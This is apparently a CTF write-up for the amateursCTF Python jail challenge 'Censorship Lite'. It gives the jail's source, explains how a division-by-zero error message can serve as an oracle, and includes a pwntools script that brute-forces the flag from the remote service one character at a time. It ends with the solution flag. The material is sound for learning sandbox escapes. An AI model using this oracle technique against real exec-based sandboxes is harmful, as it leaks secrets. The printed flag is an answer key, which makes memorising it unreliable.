# Misc - Censorship Lite

## Problem

We are faced with another Python jail problem:

```python
#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input("Give code: "))
            if any([i in code for i in "\lite0123456789"]):
                raise ValueError("invalid input")
            exec(eval(code))
        except Exception as err:
            print(err)
```

## Solution

The difficulty for this Python Jail is increased from `e,t,\` characters to `\lite0123456789`. Again, we note that if an exception was triggered, An error message will be printed. 

We can take advantage of this by considering the division-by-zero exception and perform `1/(ord(guess_char)-ord(_[flag_char_pos]))` to bruteforce the flag character by character. However, because digits are banned, a small trick is used:

```python
one = (ord('!') - ord(' ')) # = 1
# Used when encountering '\lite' --> Use ord(next_char) - one to bypass

ten = (ord('*') - ord(' ')) # = 10
# Used when encountering '0123456789' --> Use ord(next_char) - ten to bypass

```

Solve script is as follows:

```python
from pwn import *

r = remote('amt.rs', 31671)
print(r.recv(256))
# Note: replace # in final flag with ' since ' will cause syntax error
flag = ''
print(len(flag))
flaglen = 100
# Re-run a few times due to timeout, store partial result in "flag"
onestr = f"(ord('!') - ord(' '))"
tenstr = f"(ord('*') - ord(' '))"
for j in range(len(flag), flaglen + 1):
    jstr = f"(ord('{chr(j + ord(' '))}'))"
    if any([c in jstr for c in "\lite"]):
        jstr = f"(ord('{chr(j + ord(' ') + 1)}') - {onestr})"
    if any([c in jstr for c in "0123456789"]):
        jstr = f"(ord('{chr(j + ord(' ') + 10)}') - {tenstr})"
    jstr += f" - ord(' ')"
    found = False
    for i in range(32, 128):
        istr = f"ord('{chr(i)}')"
        # Substitution
        if any([c in istr for c in "\lite"]):
            istr = f"(ord('{chr(i + 1)}') - {onestr})"
        if any([c in istr for c in "0123456789"]):
            istr = f"(ord('{chr(i + 10)}') - {tenstr})"
        payload = f"{onestr} / ({istr} - ord(_[{jstr}]))"
        #print(payload)
        r.sendline(payload.encode('utf-8'))
        res = r.recv(256).decode('utf-8')
        if 'division by zero' in res:
            found = True
            flag += str(chr(i))
            print("FLAG:", flag)
            break
    if not found:
        flag += '#'
        print("FLAG:", flag)
        continue
```

## Flag

amateursCTF{sh0uld'v3_r3strict3D_p4r3nTh3ticaLs_1nst3aD}